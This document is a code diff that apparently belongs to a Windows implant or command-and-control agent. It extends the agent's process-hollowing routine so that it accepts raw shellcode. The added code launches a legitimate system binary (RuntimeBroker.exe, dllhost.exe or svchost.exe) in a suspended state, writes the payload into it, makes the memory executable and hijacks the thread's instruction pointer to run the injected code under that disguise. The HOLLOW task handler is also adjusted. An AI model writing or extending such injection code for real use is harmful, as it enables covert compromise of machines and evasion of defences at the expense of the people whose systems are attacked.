@@ -377,6 +377,38 @@ static char *thread_hijack(DWORD pid, const uint8_t *sc, size_t sc_len) {
 
 static char *do_hollow(const char *target, const uint8_t *pe, size_t pe_len) {
     if (pe_len < 0x40) return strdup("[error: payload too small]");
+    if (pe[0] != 0x4D || pe[1] != 0x5A) {
+        char tgt[MAX_PATH] = {0};
+        if (target && target[0]) {
+            strncpy(tgt, target, MAX_PATH-1);
+        } else {
+            char sys[MAX_PATH]; GetSystemDirectoryA(sys, MAX_PATH);
+            snprintf(tgt, MAX_PATH, "%s\\RuntimeBroker.exe", sys);
+            if (GetFileAttributesA(tgt) == INVALID_FILE_ATTRIBUTES)
+                snprintf(tgt, MAX_PATH, "%s\\dllhost.exe", sys);
+            if (GetFileAttributesA(tgt) == INVALID_FILE_ATTRIBUTES)
+                snprintf(tgt, MAX_PATH, "%s\\svchost.exe", sys);
+        }
+        WCHAR tgt_w[MAX_PATH];
+        MultiByteToWideChar(CP_ACP, 0, tgt, -1, tgt_w, MAX_PATH);
+        STARTUPINFOW si; memset(&si, 0, sizeof(si)); si.cb = sizeof(si);
+        PROCESS_INFORMATION pi; memset(&pi, 0, sizeof(pi));
+        if (!CreateProcessW(NULL, tgt_w, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+            char *e=(char*)malloc(128); snprintf(e,128,"CreateProcessW(%s) failed (err %lu)",tgt,GetLastError()); return e;
+        }
+        LPVOID mem = VirtualAllocEx(pi.hProcess, NULL, pe_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+        if (!mem) { TerminateProcess(pi.hProcess,1); CloseHandle(pi.hThread); CloseHandle(pi.hProcess); return strdup("VirtualAllocEx failed"); }
+        SIZE_T wr;
+        WriteProcessMemory(pi.hProcess, mem, pe, pe_len, &wr);
+        DWORD old; VirtualProtectEx(pi.hProcess, mem, pe_len, PAGE_EXECUTE_READ, &old);
+        CONTEXT ctx; memset(&ctx, 0, sizeof(ctx)); ctx.ContextFlags = CONTEXT_CONTROL;
+        if (GetThreadContext(pi.hThread, &ctx)) { ctx.Rip = (DWORD64)mem; SetThreadContext(pi.hThread, &ctx); }
+        ResumeThread(pi.hThread);
+        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
+        char *out = (char*)malloc(192);
+        snprintf(out, 192, "[+] hollow: %s PID=%lu sc=0x%llx (%zu B)", tgt, (unsigned long)pi.dwProcessId, (unsigned long long)(DWORD64)mem, pe_len);
+        return out;
+    }
     DWORD pe_off; memcpy(&pe_off, pe + 0x3C, 4);
     if (pe_off + sizeof(IMAGE_NT_HEADERS64) > pe_len) return strdup("[error: e_lfanew OOB]");
     const IMAGE_NT_HEADERS64 *nt = (const IMAGE_NT_HEADERS64 *)(pe + pe_off);
@@ -1383,7 +1415,7 @@ void dispatch_task(AgentTask *task) {
     }
     else if (strcmp(type_upper, "HOLLOW") == 0) {
         if (!task->payload || task->payload_len == 0) {
-            agent_send_result(task->id, "", "HOLLOW: no PE payload"); return;
+            agent_send_result(task->id, "", "HOLLOW: no payload"); return;
         }
         char tgt[MAX_PATH] = {0};
         json_get_str(args, "target", tgt, sizeof(tgt), "");
